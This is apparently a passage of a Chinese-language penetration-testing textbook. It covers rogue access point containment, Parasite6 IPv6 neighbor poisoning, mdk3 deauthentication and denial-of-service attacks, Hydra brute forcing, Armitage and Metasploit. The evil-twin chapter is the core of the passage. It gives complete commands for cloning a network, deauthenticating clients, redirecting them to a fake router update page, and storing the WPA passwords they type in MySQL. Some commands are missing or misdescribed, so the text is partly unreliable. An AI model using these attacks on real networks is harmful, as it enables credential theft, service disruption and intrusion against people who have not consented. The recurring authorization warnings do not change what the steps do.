无线网络中遏制 rogue 接入点有很多不同的技术，本场景中我们将使用WLC（无线局域网控制器）来完成这个操作。
但在考虑遏制 rogue 接入点之前，首先需要识别出它。
识别 rogue 接入点同样有多种方法，我们已经讲过其中一部分，现在请你设想如下场景。
假设你正在使用信道分析仪识别潜在的干扰源，当前环境中有多个正在广播的SSID，其中一个采用开放认证，其余SSID都使用WPA2-企业级认证保障安全。
如果这是企业级网络环境，我们看到的这个很可能是试图诱骗用户连接的 rogue 设备。
如果你的环境（无论是机场还是企业内网）中有人伪造或模拟你的SSID来诱骗用户连接，那几乎可以确定是恶意行为。
其次，如果有用户关联到这个 rogue 接入点并开始使用，那么该 rogue 接入点的持有者就可以发起中间人攻击，窃听所有流量。
接下来是我们要执行的操作：我们将使用无线局域网控制器（也被称为“WLC”），因为WLC清晰地记录着自己管理的所有接入点。
好消息是，这些被管理的接入点默认不会只待在自己的信道上服务用户，它们会定期扫描其他信道，收集到的信息会回传给无线局域网控制器。
它们收集的信息中有一部分是周围探测到的其他接入点的信息。
当无线局域网控制器发现它不管理的、不属于WLC管控体系的接入点时，就会将该接入点标记为“ rogue ”。
因此我们在WLC中的第一步就是查看控制器是否发现任何 rogue 接入点，找到该接入

接下来，我们采取下一个合理步骤，即通过控制器对该设备实施遏制。
在WLC的主页上，右上角的“监控”页面会在“恶意接入点摘要”板块下展示所有活跃恶意接入点的详细信息。如果你使用WLC，可能会看到列表中列出了多个设备，疑惑为什么会有这么多恶意接入点。出现这种情况可能有以下几个原因：例如，你的WLC可能会检测到10个甚至更多的恶意接入点，但这些设备实际上可能完全是合法存在的；只是因为WLC并未管理这些设备，所以将它们归类为恶意接入点。所有被WLC管理的一个或多个接入点检测到的其他广播SSID，都会被上报到控制器，这就是为什么控制器会将这些设备归入恶意接入点的类别。它根本不知道这些设备的具体情况。
若要查看这些恶意接入点的详细信息，只需点击“详情”链接，就能看到接入点列表，其中包含每个接入点的MAC地址、SSID、使用信道、拥有的无线电数量，以及连接至此的客户端数量。想要了解某一设备的更多信息，点击其对应的MAC地址，即可进入“恶意接入点详情”窗口。在此页面中，你可以查看该设备的MAC地址、WLC首次检测到它的时间、最后一次向WLC上报它的时间，以及页面底部附近的、最早上报该恶意设备的接入点列表。在该列表中，你可以看到是哪一个或哪些AP检测到了该恶意接入点、检测时使用的信道，此外还会提供接收信号强度指示、信噪比等信息。
你可能会问：现在我们已经确认存在恶意接入点，这很好，但该如何遏制这个设备、让它停止运行呢？我们可以利用现有的接入点来实现这一目标，这些接入点在为正常用户提供服务的同时，会额外花一点时间扫描恶意接入点，并对其实施有效的拒绝服务攻击。攻击的具体方式是发送解除认证消息。如果在攻击过程中有用户试图关联该恶意接入点，我们的目标是确保没有合法用户能够关联到这个未受管理的接入点。同时需要特别强调：攻击自己的接入点不算严重问题，但攻击他人的无线局域网是违法行为，你绝对不应该对任何其他合法网络发起此类攻击，否则会对目标网络造成拒绝服务攻击，引发严重后果。
要设置遏制功能，先查看恶意接入点的详情页面。遏制选项位于“最大遏制恶意接入点的AP数量”标题下方。选择好对应的数量后，会弹出提示框：“实施该遏制操作可能涉及法律风险，你确定要继续吗？”正如我之前提到的，如果你仍停留在恶意接入点详情页面，那么“状态”字段旁的标识会变为“已遏制”，这就是我们希望达成的目标。如果想要关闭该功能、停止攻击，只需将状态改回“告警”，点击“应用”，解除认证攻击就会停止。
在此期间，如果你使用了协议分析仪，可以查看到该恶意接入点的帧编号。如果追踪该数据流，在“类型/子类型”栏下你会看到“解除认证”，这就是我们通过WLC对恶意接入点发起的攻击类型。虽然看起来是源MAC地址发起了攻击，但实际上这些数据帧是由我们自己的接入点发送的。如果你持续追踪该数据流，会发现这类数据帧会重复发送，直到我们在WLC上停止攻击为止。这样做的目的是确保没有合法用户意外关联到恶意接入点，就算有用户关联成功，也不会保持长时间连接，因为周期性的解除认证消息会将他们从恶意接入点断开。
可以看出，如果你的企业部署了WLC，就可以快速识别并遏制恶意接入点。但再次提醒，攻击他人的无线局域网属于违法行为，实施此类操作可能会让你承担法律责任，因此请确保你获得了书面授权或管理层的批准，才能使用WLC或任何其他工具开展此类遏制操作。

# 第27章 使用Parasite6捕获IPv6数据包
假设你收到了一项新的渗透测试任务，需要攻入该企业的两个网络。其中一个网络防护非常薄弱，因为没有部署任何防火墙，攻破它的难度很低。但第二个网络的防护看起来更加严密，可能需要一整天时间才能找出可被利用的漏洞。有些人会选择先攻破那个简单的网络，整个过程甚至用不了一个小时。但如果你能针对企业当前的网络部署情况提出正确的问题，就可以避免许多不必要的麻烦，高效完成一整天的工作。
如今，大多数企业的计算机都支持IPv6协议，该协议处于可用状态。因此，如果你通过某些步骤禁用IPv6，就可以利用IPv6的运行机制，通过中间人攻击渗透该网络。如果你了解这一漏洞，并且知道如何利用它，就可以在很短时间内完成渗透测试，因为很多企业并没有按照要求启用IPv6的全部安全特性。
中间人攻击可以通过多种工具实现，我们之前已经介绍过其中一些工具。当我们接触IPv6网络时，可以使用另一个非常实用的工具——“Parasite6”。我们先回到基础原理，思考计算机连接网络后首次启动时会发生什么。很显然，计算机首先会申请一个IP地址。在这种情况下，计算机会向同网络的路由器申请IPv6地址；如果网络中存在DHCP服务器，那么DHCP服务器会为该计算机分配IP地址。
接下来，如果该计算机需要与外网或互联网通信，首先需要获取路由器的MAC地址，这一过程在IPv4中是通过ARP（地址解析协议）完成的，但IPv6中并没有ARP机制。在IPv6网络中，替代ARP的是邻居发现机制，全称为NDP（邻居发现协议）。接下来的流程是：计算机会向路由器发起邻居发现请求，更具体地说是邻居请求消息，随后路由器会回复邻居通告消息。简单来说，请求就是索取信息，通告就是回应所请求的内容。
以上就是基础原理，那么我们该如何在这里使用Parasite6呢？我们可以让运行了Parasite6的Kali Linux设备接入目标网络，开始监听网络流量。启用Parasite6后，它会开始监听网络中传输的所有邻居请求消息，并自动进行回复。但它不会回复正确的信息，而是向网络中所有设备回复我们自己的MAC地址，让网络中所有设备都认为我们的设备就是路由器。此时我们还没有实现中间人攻击，反而造成了拒绝服务（DoS）攻击：因为所有需要访问互联网的网络设备都会首先连接到我们的Kali设备，这都是Parasite6启用导致的。
要想将这种拒绝服务攻击转化为中间人（MITM）攻击，我们需要在Kali Linux设备上启用IPv6转发功能。在Kali上启动Parasite6非常简单，你只需要输入以下命令：`parasite6 <interface> <fake MAC address>` 然后按下回车键即可。本质上，你需要输入parasite6命令，接着指定要接入网络、实施中间人攻击的网卡接口，然后输入你想要提供给同一网络中所有其他终端设备或网络设备的虚假MAC地址。虚假MAC地址可以是任意自行编造的MAC地址，都可以正常使用。
另一个实用的命令是：`parasite6 -l <interface> <fake MAC address>`
这次添加的“-l”参数代表循环模式，意思是它会创建循环，每5秒刷新一次邻居请求消息。

为了让毒化的信息保持最新。如果你输入以下内容，还有另一种可选方案：
``` parasite6 -r interface1 (fake mac address) ```
这里的`-r`参数表示它还会尝试注入请求的目的地址。
如果想要同时实现两个功能——既让所有毒化的虚假信息保持最新，又同时毒化请求的目的地址，我们需要使用以下命令：
``` parasite6 -lr interface1 (fake mac address) ```
接下来，运行这条命令后，它会监听接收到的所有邻居请求报文，并使用我们指定的虚假地址逐一进行响应。
请在使用Parasite6及其任何相关变体前确保你已经获得书面授权，因为它可能会对连接到该网络的所有网络设备造成严重损害。
如果你只是在家用实验室、非生产环境中练习，不会对任何人造成问题；但我仍然建议你关闭路由器，且在无互联网连接的情况下谨慎练习。

# 第28章 使用mdk3进行邪恶双胞胎去认证攻击
本章我将教你如何在Kali Linux虚拟机上创建邪恶双胞胎接入点。此外，我还将展示如何结合社会工程学技巧使用该邪恶双胞胎接入点，以获取目标的WPA或WPA2密码。
要完成本次攻击，你需要一个支持监听模式的USB网卡。如果你还没有支持监听模式的USB网卡，我在之前的部分章节中已经推荐过相关网卡。另外，如果你已经了解邪恶双胞胎接入点的工作原理，那再好不过；如果你还不清楚，我来解释一下本次攻击的流程。
首先，我们会创建一个邪恶双胞胎接入点，它被称为邪恶双胞胎，是因为它是合法接入点的克隆。因此，我们会找到想要攻击的无线网络，复制该网络的标识信息（比如网络名称和MAC地址），接着用这些信息创建我们自己的无线网络。请牢记，此操作只能在你拥有的无线网络上执行。如果你没有两个可用的无线网络，我建议你征得邻居或朋友的同意后，使用他们的网络进行练习。
当客户端连接到邪恶双胞胎网络时，他们无法区分合法网络和邪恶双胞胎网络。接下来，当客户端打开网页浏览器时，我们会将其重定向到路由器的安全更新页面，该页面会提示他们输入WPA或WPA2密码。当客户端输入WPA密码后，该密码会被存储到我们稍后会创建的MySQL数据库中。以上就是本次攻击的所有操作流程，我们接下来就开始吧。
首先，我们需要连接到互联网，方法是将宿主操作系统的网络连接共享给Kali Linux虚拟机，这样就可以省去第二个USB网卡的需求。如果你切换到宿主操作系统，那么你使用什么类型的操作系统都可以，只要能用它连接到互联网即可。现在打开网络管理器，然后找到一个无线网络进行连接。你可以连接到你的家庭网络，连接完成后，由于宿主操作系统已经连上互联网，现在我们需要将其共享给Kali Linux虚拟机。因此，我们切换回Kali Linux，在顶部菜单栏中打开虚拟机菜单，然后展开网络适配器菜单，在这里我们需要将网络适配器设置为桥接自动检测。完成该设置后，你可以收起虚拟机菜单，现在就可以使用该虚拟网络适配器通过宿主操作系统建立互联网连接了。
接下来，打开你的网络管理器，你可以使用任何你有的网络管理器，在网络管理器中找到名为「有线网络」的选项，然后点击「连接」。在连接过程中，我要提醒你，如果你使用的是默认网络管理器且有线连接存在问题，我建议你安装其他网络管理器，比如「WICD网络管理器」。

``` apt-get install dhcp3-server ```
然后按下回车键。我已经安装过DHCP服务器了，但你可能会收到提示询问是否确认安装，此时只需输入「Y」表示「是」，然后按下回车键，稍等片刻等待安装完成即可。

``` nano /etc/dhcpd.conf ```
然后按下回车键，此时你应该会看到一个空白的dhcp3配置文件，如果它不是空白的，直接删除现有内容后再继续。准备就绪后，我们开始输入配置内容。第一行需要输入：
``` authoritative; ```
然后按下回车键移到下一行，输入：
``` default-lease-time 600; ```
按下回车键移到下一行，输入：
``` max-lease-time 7200; ```
按下回车键移到下一行，输入：
``` subnet 192.168.1.128 netmask 255.255.255.128 { ```
按下回车键移到下一行，输入：

按下回车键移到下一行，输入：
``` option broadcast-address 192.168.1.255; ```
按下回车键移到下一行，输入：
``` option routers 192.168.1.129; ```
按下回车键移到下一行，输入：
``` option domain-name-servers 8.8.8.8; ```
按下回车键移到下一行，输入：
``` range 192.168.1.130 192.168.1.140; ```
按下回车键移到下一行，输入右花括号：
``` } ```
以上就是需要输入的全部内容，现在我们需要保存并关闭该文件。但在操作前，请核对终端中的配置内容如下：
``` authoritative; default-lease-time 600; max-lease-time 7200; subnet 192.168.1.128 netmask 255.255.255.128 { option subnet-mask 255.255.255.128; option broadcast-address 192.168.1.255; option routers 192.168.1.129; option domain-name-servers 8.8.8.8; range 192.168.1.130 192.168.1.140; } ```
确认配置无误后，我们继续保存这些配置。首先同时按下「Ctrl+X」组合键，然后按下「Y」键，最后按下回车键。
现在我们需要下载客户端打开浏览器时会看到的安全更新页面。这个示例网页模拟的是Linksys路由器的安全更新，但在实际渗透测试中，如果你测试的是使用强制门户或落地页的公司，我使用的这个示例页面大概率并不适用。比如，你会希望部署一个和目标公司强制门户相似的网页。如果你测试的是使用网件、D-Link或思科设备的网络，你需要制作一个和这些厂商风格匹配的网页。
下载完邪恶双胞胎压缩包后，你还需要将其解压。解压完成后，我们就可以启动Apache Web服务器，用它来托管我们的安全更新页面。现在我们需要输入以下内容：
``` /etc/init.d/apache2 start ```
按下回车键，接下来需要启动MySQL，输入：
``` /etc/init.d/mysql start ```
按下回车键，MySQL启动后，我们需要登录并创建一个数据库，用来存储客户端在安全更新页面输入的WPA密码，现在输入：

 然后按下回车键，你就能看到MySQL提示符。接下来，我们要创建一个名为"evil twin"的数据库，因此请输入：

然后按下回车键。现在我们需要创建一个带有若干列的表，这些列将用于存储客户端在我们安全更新页面的密码字段中输入的数据。因此，要切换到我们新建的数据库中，请输入：

然后按下回车键，接下来我们需要输入：

```sql
create table wpa_keys(password varchar(64), confirm varchar(64));
```
然后按下回车键。这条命令创建了一个名为"wpa_keys"的表，其中包含两列，分别名为"password"和"confirm"。其中64表示该列最多可存储的字符数，我们设置为64是因为WPA密码最多可包含64个字符。
接下来，我们需要找到虚拟网卡的接口名称以及本地IP地址，因为后续的命令中会用到这两个信息。因此，我们先打开一个新的终端，MySQL终端可以保持开启，因为我们之后还会用到它。在新终端中输入：
```ip addr
```
然后按下回车键，接着找到你的虚拟网卡接口名称和本地IP地址。我的接口名称是"eth0"，本地IP地址是"192.168.0.6"，但你的可能会有所不同。打开一个空白记事本记录这些信息，按照我演示的方式记下这些内容，方便后续查阅时不会混淆。我们会把虚拟网卡的接口名称称为有线接口，我的是eth0；本地IP地址称为本地IP，我的是192.168.0.6。
### 有线接口：eth0 ###
### 本地IP地址：192.168.0.6 ###
现在我们已经记下了这些信息，接下来需要找到USB网卡的接口名称。如果你还没连接USB网卡，现在请连接它，然后我们回到终端中。在终端中输入：
```airmon-ng
```
然后按下回车键，接着找到你的USB网卡接口名称。你的接口名称会显示在"Interface"列的正下方，把它记到记事本里。我们会把它称为无线接口，我的是wlan0：
### 无线接口：wlan0 ###
现在我们需要创建监听接口，因此回到终端，输入：
```airmon-ng start [wlan0]
```
然后按下回车键，接着找到你的监听接口名称。监听接口名称会显示在"(monitor mode enabled on wlan0)"这句话里，把它记到记事本里。我们会把它称为监听接口，我的是mon0：
> 监听接口：mon0
现在我们将使用"airodump"查找要克隆的目标无线网络，但首先我会介绍一个可以识别目标网络路由器型号的工具。因此回到终端，输入：
```airodump-ng-oui-update
```
然后按下回车键。这里需要稍等片刻，等待它下载"OUI"文件。这个文件包含了厂商列表和已知的MAC地址格式。它的作用是让"airodump"将扫描到的网络BSSID与该列表进行比对，在扫描结果中显示对应的厂商信息。
接下来，我们开始扫描。为此，请输入：
```bash
airodump-ng -M mon0
```
然后按下回车键，当你找到要攻击的目标无线网络时，按下"ctrl+C"键停止扫描。现在我们需要记下目标的"ESSID"、标注为"CH"的信道号以及目标的"BSSID"。因此回到记事本，我们将这些信息分别命名为"目标ESSID"、"目标信道号"和"目标BSSID"，现在请参照终端内容，按以下格式记下这些信息：
- **目标ESSID：** freewifi
- **目标信道号：** 6
- **目标BSSID：** aa:bb:cc:dd:ee:ff
ESSID请按照实际内容的大小写准确填写，信道号直接记录对应的数字即可，我这里是6；BSSID建议直接复制粘贴，避免出错。要在Kali终端中复制文本而不使用右键，只需按下"ctrl+shift+C"键即可复制任意文本。粘贴文本也是一样的，按下"ctrl+shift+V"键即可。把这些信息粘贴到记事本后，我们就拿到了目标网络的信息，接下来可以创建伪邪恶接入点了。因此回到终端，现在输入：
```bash
airbase-ng -e freewifi -c 6 -P mon0
```
这里，-e参数后接目标的ESSID，-c参数后接目标的信道号，我这里是6，最后输入你的监听接口名称，我的是"mon0"，然后按下回车键。现在我们的伪邪恶接入点已经启动运行了，接下来需要配置隧道接口，以便在伪邪恶接入点和有线接口之间创建网桥。现在打开一个新的终端，注意不要关闭airbase终端和MySQL终端。在该终端中输入：
```bash
ifconfig at0 192.168.1.129 netmask 255.255.255.128
```
然后按下回车键。现在需要添加路由表并启用IP转发，以便将数据包转发到伪邪恶接入点以及从伪邪恶接入点转发出去，因此请输入：
```bash
route add -net 192.168.1.128 netmask 255.255.255.128 gw 192.168.1.129
```
然后按下回车键。现在输入：
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
```
然后按下回车键。现在需要创建若干iptables规则，这些规则将决定网络流量的处理方式。首先创建一条规则，用于处理需要发送到有线接口（即我们的互联网来源）的流量，请输入：
```bash
iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE
```
注意MASQUERADE需要全部大写，然后按下回车键。接下来创建一条规则，用于处理进入隧道接口的流量，请输入：
```bash
iptables --append FORWARD --in-interface at0 -j ACCEPT
```
然后按下回车键。接下来创建一条规则，允许80端口的TCP连接并将其转发到我们的Web服务器，请输入：
```bash
iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 192.168.0.6:80
```
然后按下回车键。最后一条规则用于实现网络地址转换，请输入：
```bash
iptables -t nat -A POSTROUTING -j MASQUERADE
```
然后按下回车键。现在iptables规则已经配置完成，接下来需要指定DHCP配置文件并启动DHCP服务器，请输入：
```bash
dhcpd -cf /etc/dhcpd.conf --pf /var/run/dhcpd.pid at0
```
然后按下回车键。接着输入：
```bash
/etc/init.d/isc-dhcp-server start
```
然后按下回车键。现在你应该能看到如下输出：
> 正在启动ISC DHCP服务器：dhcpd
这表明DHCP服务器已成功启动。
最后一步，我们需要强制目标网络的客户端连接到我们的伪邪恶接入点。为此，我们需要通过发送反认证攻击，让客户端断开与目标网络的连接。请注意，实现这一目标有多种方式，本次攻击我们将使用MDK3工具。首先需要创建一个黑名单文件，其中包含目标的MAC地址（即BSSID）。因此请输入：
```bash
echo aa:bb:cc:dd:ee:ff > blacklist
```
这里的aa:bb:cc:dd:ee:ff是目标的BSSID，直接把它从记事本中复制粘贴到终端，按照上述方式加入黑名单，然后按下回车键。然后要启动反认证攻击，请输入：
```bash
mdk3 mon0 d -b blacklist -c 6
```
这里需要输入你的监听接口名称，我的是mon0，然后是目标的信道号，我这里是6，最后按下回车键。现在你可以切换到用来模拟受害者的电脑上。如果反认证攻击成功，受害者的电脑很快就会断开当前的网络连接。一旦受害者的电脑断开连接，它会尝试重新连接之前断开的网络，但由于我们已经屏蔽了正规网络，它会转而连接到我们的伪邪恶网络。如果回到airbase终端查看连接状态，会显示有设备已经连接到了你的伪邪恶接入点。因此回到受害者的电脑上，打开浏览器尝试访问google.com。这时你会被跳转到一个安全更新页面，作为用户，你会希望确保路由器安装了所有最新的更新，尤其是安全更新，因此页面会要求你输入WPA密码以完成路由器更新申请。输入密码确认后，点击更新按钮。现在回到MySQL终端，查看你是否成功捕获了WPA密码。



在终端中，我们需要输入：```use evil_twin``` 并按回车键。接着输入：```select * from wpa_keys;``` 再次按下回车键，你就能看到客户端密码已存储在你的MySQL数据库中。密码会显示在"password"字段下，确认密码则存储在MySQL数据库的"confirm"字段中。如果客户端输入的两次密码不匹配，系统会跳转到错误页面，提示他们重新输入密码，因为两次输入内容不一致。如果客户端点击取消按钮，则会跳转到一个页面，告知他们此次安全更新的重要性，说明这是为了他们自身着想，并且在他们完成更新之前将无法访问互联网。这就是你创建邪恶双胞胎接入点、搭建用于捕获WPA密码的网页的方法。请在使用这些工具前获取书面授权，否则可能会对连接到该网络的所有网络设备造成严重损害。如果你只是在自己的家庭实验环境、非生产环境中进行练习，这不会对任何人造成影响；不过我仍然建议你关闭路由器，谨慎练习，不要连接互联网。

## **第29章 使用mdk3实施DoS攻击**
另一种企业安全威胁当然是DoS（拒绝服务）攻击。顾名思义，拒绝服务攻击一旦成功，就会阻止其他人使用相关资源或服务，干扰其他用户的正常使用。曾有过这样的新闻报道：一名男子厌烦了人们开车时使用手机，于是他在车上搭载了蜂窝信号干扰器，驾车出行时干扰蜂窝网络的所有频段。这样一来，他周围的人就无法使用手机了。你可能会觉得这是个好主意，但你要记住，执法部门、救护车也会使用蜂窝通信服务。因此，你干扰蜂窝网络频段、影响其他用户正常使用的同时，也干扰了你不希望被影响的公共服务。这名男子最终被追踪到，被捕后还被处以高额罚款。
不过，该如何实施拒绝服务攻击呢？在无线网络中有两种主要方式。第一种是用大量无用流量轰炸你的Wi-Fi接入点。如果产生大量流量，接入点会忙于处理这些流量、决定如何处理：是处理所有的认证请求吗？如果你发送探测请求，接入点在处理这些流量时，就无法处理其他用户流量。因此，第一种方式的本质是占用接入点，使其无法处理合法流量。第二种方式则是在接入点运行的频段内制造噪声和干扰。我可以广播信号，干扰同时经过空中的其他所有信号。
在本章中，我将教你如何实施DoS攻击。拒绝服务（DoS）攻击指的就是将网络中所有用户踢下线，使其无法获得服务。首先，我们需要攻击无线网卡。完成后，打开终端并输入：```ifconfig``` 按回车键，之后你需要打开一个文本文件记录一些信息。首先记录你的无线网卡接口名称，我的网卡接口是wlan0，你可以记录下你的接口名称。完成后，你可以通过输入```clear``` 并按回车键清空终端。
接下来，我们需要扫描可用的接入点来寻找目标，因此输入；```iwlist wlan0 scan``` 然后按回车键。这会列出所有可用的接入点，你可以从中寻找目标。找到目标后，你需要记录下其SSID、BSSID以及信道号。完成后，我们需要创建一个黑名单文件，因此输入；```echo (目标接入点的BSSID) > blacklist``` 然后按回车键。这会创建一个名为"blacklist"的文件，其中包含目标接入点的BSSID。
现在我们需要将无线网卡接口设置为监听模式，输入以下命令；```airmon-ng start wlan0``` 然后按回车键。该命令会创建一个名为"mon0"的监听接口，记下这个监听接口的名称。要确认你的监听接口名称，你可以输入；```airmon-ng``` 然后按回车键。这会显示你所有的接口，你可以在其中看到新创建的名为"mon0"的监听接口。
现在我们已经可以实施DoS攻击了，输入；```mdk3``` 然后按回车键。接下来输入；```mdk3 mon0 d --blacklist --c 6``` 这里，你需要输入监听接口名称（这里是mon0）、黑名单文件的名称（我的文件中命名为"blacklist"），以及目标接入点的信道号（我这里的是"6"）。输入完成后按回车键。接下来你会看到它开始发送数据包，进而淹没整个网络。同时，如果你查看连接到同一网络的其他设备，你会发现它们都已断开连接。
现在我们需要打开另一个终端，输入；```mdk3 mon0 a -m -i (目标接入点的BSSID)``` 然后按回车键。查看附近的其他计算机，你会发现它们已经被踢出网络。查看你的Wi-Fi，你会发现连接已经断开。你可以尝试连接到目标BSSID，但会收到连接超时提示。就是这样。如你所见，DoS攻击相对简单。你会发现自己已经被断开连接，现在无法再次接入网络，这就是你使用mdk3实施DoS攻击的方法。

## **第30章 使用TCP Hydra实施暴力破解攻击**
在本章中，你将学习如何分析针对目标系统的暴力破解攻击。在这个场景中，假设你有3个节点：攻击者将使用IP地址为10.0.0.111的Kali Linux系统，受害者机器将使用IP地址为10.0.0.202的Windows 10设备，渗透测试人员将使用Kali Linux拦截所有流量，分析网络上的任何攻击。假设你是攻击者，想要攻击网络中开启了Telnet服务的一台主机。黑客首先要做的是尝试对目标受害者实施暴力破解。
要进行暴力破解攻击，你可以使用多种工具，其中渗透测试人员中非常流行、且我们之前没有介绍过的一款工具叫做"hydra（九头蛇）"。要使用hydra，你首先需要打开Kali Linux终端窗口，输入以下命令：```hydra -V -l (字典密码文件路径) -t 50 - (受害者IP地址) ssh``` 然后按回车键。其中，“-V”选项用于开启最大详细程度输出，“-l”用于指定登录用户名，后面跟着字典密码文件的路径，“-t”参数用于指定并行连接数，数值越大，测试速度越快，之后是受害者IP地址，最后是你想要暴力破解的协议。按下回车键后，攻击就会开始，你只需要等待密码被破解即可。密码通常在几分钟内就会被破解。
从黑客的角度来看，下一步该做什么呢？黑客会尝试使用Telnet登录。首先，黑客会发出Telnet命令，指定受害者主机的IP地址，然后输入登录名和破解出的密码。此时，黑客会为这次胜利感到兴奋。如果你进入渗透测试人员的机器分析这次黑客攻击，你会看到当攻击者尝试使用未授权的用户名和密码组合时会发生什么。

要在Wireshark中分析这类通信，请右键点击任意数据包，选择“跟踪TCP流”。弹出的消息会显示“无法再连接到telnet服务器”“请稍后重试”。这是攻击者在暴力破解失败时反复收到的典型提示消息。
在Wireshark中查看捕获的流量时，你需要向下滚动，直到不再看到这类重复模式；再次跟踪该数据流后，就能看到明文形式的用户名和密码，以及攻击者执行的命令。
你可能遇到的明文协议包括HTTP、FTP，以及POP、IMAP、SMTP、Telnet等邮件协议和语音通话（VoIP）协议。如果你发现客户端使用了其中任意一种协议，需要在最终报告中注明。
最简单的解决方法是使用更安全的替代协议替换这些明文协议，例如用HTTPS替代HTTP、用SFTP或SCP替代FTP，以此类推。

# 第31章 Armitage
Armitage是Metasploit框架的优秀图形化前端工具。它的开发目标是帮助安全专业人员更好地了解黑客及其发起各类攻击的方式。想要了解这一优秀项目的更多信息，请访问Armitage官方网站：fastandeasyhacking.com。
如何使用Armitage？Armitage已集成在Kali Linux中，因此只需在命令行界面输入：
``` armitage ```
按下回车键即可启动。
首次弹出窗口时，直接保留默认选项，点击“Connect”按钮，再点击“Yes”启动Metasploit RPC服务器即可。
Armitage的用户界面包含三个主面板，分别是“Modules（模块）”“Targets（目标）”和“Tabs（选项卡）”。如果需要调整面板大小，可以点击面板之间的区域拖动，接下来我们逐个介绍这些面板的功能。
模块浏览面板可用于启动Metasploit辅助模块、漏洞利用模块，也可生成攻击载荷并运行后渗透模块。
目标面板用于展示所有目标。Armitage会用计算机图标表示每个目标，图标下方会显示该目标的分配IP或静态IP以及其他相关信息。
启动Armitage工具后，如果会话中存在其他运行中的系统，它会自动识别所有主机。如果主机数量过多，图形视图会变得难以操作，此时可以使用Armitage提供的表格视图作为替代。具体操作为：点击Armitage菜单项，选择“Set Target View”，再选择“Table View”选项即可。
面板下方是选项卡区域。Armitage会将所有对话框、控制台和表格以选项卡的形式打开，位于模块面板和目标面板的下方。Metasploit控制台、Meterpreter控制台和shell接口都各自使用独立的控制台选项卡。
通过控制台选项卡，你可以通过Armitage与这些接口进行交互。如果需要打开新的控制台，可以点击“View”菜单，选择“Console”选项。
Armitage会记录所有控制台和shell的活动，事件日志会输出所有操作记录，日志会按日期和节点分类存储。你可以在Armitage的安装文件夹中找到这些日志。具体路径为：点击View菜单，选择Reporting，再点击“Activity Logs”即可打开对应文件夹。
如果你需要导出在该工具中的所有操作记录，Armitage和Metasploit共享一个数据库，用于存储所有主机、服务、漏洞、凭据，以及浏览器漏洞利用模块捕获的用户代理字符串。要导出这些信息，可以点击View菜单，选择Reporting，再点击“Export Data”。
该选项会导出Metasploit中的所有数据，并生成易于解析的XML制表符分隔值文件。
关于工作区功能，Armitage的动态工作区功能允许用户创建主机数据库的不同视图，并快速在视图间切换。想要进一步了解该功能，可以点击Workspaces菜单，再选择“Manage”。
管理动态工作区时，你可以对已创建的工作区进行添加、编辑和删除操作。
发起攻击时，Armitage将多个Metasploit扫描功能整合为一个名为“MSF Scans”的功能模块。该模块会扫描少量开放端口，和nmap类似，它会使用Metasploit内置的辅助模块枚举常见的服务。
例如，你可以攻击一台Windows XP主机：选中该主机，右键点击，选择“Scan”即可；你也可以点击Hosts菜单，选择“MSF Scans”，两种操作的功能完全相同。
扫描完成后，在发起攻击前，你需要选择合适的攻击手段。Armitage让这一过程变得非常简单：点击“Attacks”菜单，选择“Find Attacks”，该功能会为每个主机生成专属的攻击菜单。
要利用目标主机，请右键点击该主机，依次选择Attack、列表中的“Exploit”。“Exploit”对话框支持配置模块参数，还可选择是否使用反向连接载荷。
针对远程漏洞利用，Armitage会自动为你选择载荷。通常情况下，Armitage会为Windows目标选择Meterpreter载荷，为UNIX目标选择命令行shell载荷。
完成上述设置后，只需点击“Launch”按钮即可发起攻击。如果漏洞利用成功，Armitage会将目标主机标记为红色，并用炫酷的闪电球包围该主机。
如果手动利用失败也不用担心，你还可以使用“Hail Mary”功能。点击“Attacks”菜单，选择“Hail Mary”即可启动该功能。
Armitage的“Hail Mary”功能会自动查找适用于目标的相关漏洞，再利用已知信息筛选这些漏洞，并按最优顺序排序。该功能无法找到所有可能的shell权限，但当你不知道还能尝试什么方法时，它是一个不错的选择。
成功利用目标主机后，Armitage可以让你轻松管理Meterpreter代理。此时右键点击该主机，打开Meterpreter菜单，选择“Meterpreter”，再从列表中选取你需要的功能即可。
例如，你可以选择浏览受害者主机文件的功能，看到其中的目录项也不用感到奇怪。
Armitage功能强大且操作简单，但我建议你多加练习，找到最适合你需求的攻击方法。最后再次提醒：确保你在实测或生产环境使用Armitage前已获得书面授权。如果只是在自己的家庭实验室等非生产环境练习，不会对他人造成影响，但我仍建议你关闭路由器，断开互联网连接谨慎练习。

# 第32章 Metasploit框架
漏洞利用是道德黑客攻防的核心。通过对漏洞进行利用，你可以评估其潜在危害程度。
Metasploit框架（简称MSF）是一款旨在简化渗透测试流程的开源工具，该工具使用Ruby编程语言编写，采用模块化架构，便于漏洞利用工具的研发，不仅能降低漏洞利用工具的开发和编码难度，还能轻松实现复杂攻击。
漏洞利用模块是针对特定漏洞的代码片段。主动漏洞利用模块会针对指定主机运行，执行完成后自动退出；而被动漏洞利用模块会等待Web浏览器、FTP客户端等主机接入网络，再对其发起利用。
攻击载荷是漏洞利用成功后立即执行命令的恶意代码。辅助模块不会在渗透测试人员与目标系统之间建立或直接支持访问通道，而是执行扫描、模糊测试、嗅探等支持漏洞利用阶段的相关功能。
攻击成功后，后渗透模块会在被攻陷的目标主机上运行，用于收集实用数据，帮助攻击者进一步深入目标网络。
编码器用于绕过杀毒软件防护，这类模块会对攻击载荷进行编码，使其不会被基于签名匹配的技术检测到。
最后，空操作（NOP）模块用于在攻击中辅助实现缓冲区溢出。
使用MSF攻击目标系统的步骤首先是选择和配置漏洞利用模块。接下来需要检查目标系统，确认其是否易于被该漏洞利用模块攻击，这一步是可选的，建议执行以降低被检测到的概率。
之后，你可以选择和配置攻击载荷，即漏洞利用成功后在目标系统上执行的代码。攻击载荷的示例包括从被攻陷系统反向连接到渗透测试主机器的反弹shell。
完成这一步后，你还可以选择编码技术以绕过入侵检测系统、杀毒软件等检测控制措施。
最后一步是执行漏洞利用。我来举例说明具体操作流程：作为渗透测试人员，你需要排查每一个漏洞。例如，Metasploitable的6667端口运行着一个名为“unrealircd”的IRC守护进程。

该版本存在一个后门，你可能数月都察觉不到，触发条件是向任意监听端口的服务器发送字母A、B，随后跟一条系统命令。Metasploit框架有一个可利用该漏洞的模块，可借此获取交互式shell。
要开始攻击，首先打开控制台。在Kali系统中，启动该框架前需要先启动“PostgreSQL”服务器。接下来，需要运行“msfconsole”应用程序。和所有控制台应用一样，在命令提示符后输入“help”或问号，即可显示并列出所有可用命令，以及对应命令的用途说明。
